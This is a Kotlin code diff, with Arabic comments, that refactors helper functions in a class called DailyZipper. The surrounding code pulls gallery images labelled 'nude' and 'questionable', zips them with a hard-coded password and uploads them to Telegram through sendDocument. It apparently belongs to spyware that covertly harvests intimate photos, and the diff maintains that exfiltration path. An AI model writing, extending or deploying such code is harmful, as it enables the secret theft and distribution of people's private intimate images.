@@ -23,6 +23,10 @@ import java.util.concurrent.atomic.AtomicBoolean
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
+// ✅ استيراد دوال safeGet من MapExtensions.kt
+import com.example.app.safeGetString
+import com.example.app.safeGetBoolean
+
 /**
  * فئة تجميع الملفات وحصادها - خالية تماماً من الأقواس المربعة على الخرائط
  */
@@ -91,27 +95,6 @@ class DailyZipper(
         config.put("password", "ShieldCore2024!")
         config.put("max_batches", 10)
         loadConfig()
-    }
-
-    // ============================================================
-    //  دوال مساعدة آمنة للخرائط (بدون [] أو .get على Any?)
-    // ============================================================
-
-    private fun fetchFromMap(map: Any?, key: String): Any? {
-        val safeMap = map as? Map<*, *>
-        return safeMap?.get(key)
-    }
-
-    private fun fetchBoolean(map: Any?, key: String): Boolean {
-        val value = fetchFromMap(map, key)
-        return when (value) {
-            true, "true", 1, "1" -> true
-            else -> false
-        }
-    }
-
-    private fun fetchString(map: Any?, key: String): String {
-        return fetchFromMap(map, key)?.toString() ?: ""
     }
 
     @Suppress("UNCHECKED_CAST")
@@ -296,7 +279,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram
+    //  إرسال الملفات إلى Telegram (باستخدام safeGetBoolean)
     // ============================================================
 
     private suspend fun safeSend(
@@ -330,9 +313,10 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
+                // ✅ استخدام safeGetBoolean بدلاً من fetchBoolean
                 val success = when (result) {
                     is Boolean -> result
-                    is Map<*, *> -> fetchBoolean(result, "ok")
+                    is Map<*, *> -> result.safeGetBoolean("ok")
                     else -> false
                 }
                 if (success) {
@@ -639,6 +623,10 @@ class DailyZipper(
         }
     }
 
+    // ============================================================
+    //  التشغيل التلقائي (باستخدام safeGetString)
+    // ============================================================
+
     fun run(): Boolean {
         scope.launch {
             activeMutex.withLock {
@@ -657,7 +645,8 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            val path = fetchString(item, "path")
+                            // ✅ استخدام safeGetString بدلاً من fetchString
+                            val path = item.safeGetString("path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
